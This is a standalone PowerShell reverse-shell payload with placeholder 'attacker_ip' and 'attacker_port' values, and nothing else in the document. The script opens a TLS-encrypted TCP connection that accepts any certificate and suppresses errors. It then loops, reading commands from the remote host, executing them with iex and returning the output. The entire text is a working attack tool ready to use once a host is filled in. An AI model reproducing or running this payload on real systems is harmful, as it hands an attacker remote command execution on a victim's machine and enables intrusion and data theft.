$ErrorActionPreference = 'SilentlyContinue'; $client = New-Object
System.Net.Sockets.TCPClient('attacker_ip', attacker_port); $stream = $client.GetStream(); $sslStream =
New-Object System.Net.Security.SslStream($stream, $false, {$true} );
$sslStream.AuthenticateAsClient('attacker_ip'); $writer = New-Object
System.IO.StreamWriter($sslStream); $reader = New-Object System.IO.StreamReader($sslStream);
while($true) { $writer.WriteLine('PS ' + (pwd).Path + '> '); $writer.Flush(); $command =
$reader.ReadLine(); if($command -eq 'exit') { break; }; $output = iex $command 2>&1 | Out-String;
$writer.WriteLine($output); $writer.Flush() }; $client.Close()
